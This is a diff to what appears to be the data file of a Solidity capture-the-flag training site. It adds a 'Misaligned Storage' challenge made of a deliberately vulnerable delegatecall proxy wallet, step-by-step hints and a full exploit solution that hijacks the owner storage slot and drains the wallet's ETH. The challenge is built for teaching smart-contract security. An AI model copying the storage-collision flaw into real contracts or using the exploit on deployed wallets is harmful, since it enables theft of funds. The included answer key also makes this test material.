@@ -115,33 +115,83 @@ contract AccessControl {
     ],
   },
   3: {
-    title: 'Token Overflow',
+    title: 'Misaligned Storage',
     tags: ['solidity', 'medium', 'security', 'ctf'],
     points: 200,
-    scenario: 'The token contract has an integer overflow vulnerability.',
+    scenario: 'UpgradeableWallet is an upgradeable contract, executes code at WalletImplementation via delegatecall.',
     vulnerableCode: `// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
-contract Challenge3_Token {
-    mapping(address => uint256) public balances;
-    
-    function transfer(address to, uint256 amount) external {
-        balances[msg.sender] -= amount;
-        balances[to] += amount;
+contract UpgradeableWallet {
+    address public implementation;
+    address payable public owner;
+
+    constructor(address _implementation) {
+        implementation = _implementation;
+        owner = payable(msg.sender);
+    }
+
+    fallback() external payable {
+        (bool ok,) = implementation.delegatecall(msg.data);
+        require(ok, "failed");
+    }
+
+    function setImplementation(address _implementation) external {
+        require(msg.sender == owner, "not owner");
+        implementation = _implementation;
+    }
+}
+
+contract WalletImplementation {
+    address public implementation;
+    uint256 public limit;
+    address payable public owner;
+
+    receive() external payable {}
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "!owner");
+        _;
+    }
+
+    function setWithdrawLimit(uint256 _limit) external {
+        limit = _limit;
+    }
+
+    function withdraw() external onlyOwner {
+        uint256 amount = address(this).balance;
+        if (amount > limit) {
+            amount = limit;
+        }
+        owner.transfer(amount);
     }
 }`,
     tasks: [
       {
         id: 1,
-        description: 'Exploit the integer overflow to gain tokens.',
+        description: 'Drain all ETH from the wallet. The function pwn will be called to initiate the exploit.',
         completed: false,
       },
     ],
     hints: [
-      'Solidity 0.8+ has built-in overflow protection.',
-      'But older versions or unchecked blocks can be vulnerable.',
-      'Think about how to manipulate the arithmetic.',
+      'Update owner by calling setWithdrawLimit',
+      'Set implementation to UpgradeableWalletExploit contract.',
+      'Withdraw all ETH from the wallet by calling withdraw().',
+      'Declare an receive() to receive ETH from UpgradeableWallet.',
     ],
+    solution: `receive() external payable {}
+
+function pwn() external {
+    IUpgradeableWallet(target).setWithdrawLimit(
+        uint256(uint160(address(this)))
+    );
+    IUpgradeableWallet(target).setImplementation(address(this));
+    IUpgradeableWallet(target).withdraw();
+}
+
+function withdraw() external {
+    payable(msg.sender).transfer(address(this).balance);
+}`,
   },
   4: {
     title: 'Lottery Randomness',
